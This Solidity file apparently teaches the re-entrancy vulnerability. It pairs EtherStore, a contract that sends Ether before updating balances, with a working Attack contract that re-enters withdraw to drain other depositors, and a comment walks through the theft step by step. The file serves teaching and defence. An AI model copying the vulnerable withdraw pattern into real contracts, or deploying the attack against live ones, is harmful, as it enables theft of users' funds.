// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

// EtherStore is a contract vulnerable to re-entrancy attack. Let's see why.

/*
1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).
5. Call Attack.collectEther to withdraw Ether from Attack

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract EtherStore {
    // Withdrawal limit = 1 ether / week
    uint public withdrawalLimit = 1 ether;
    mapping(address => uint) public lastWithdrawTime;
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);
        require(_amount <= withdrawalLimit);
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;
        lastWithdrawTime[msg.sender] = now;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    function collectEther() public {
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
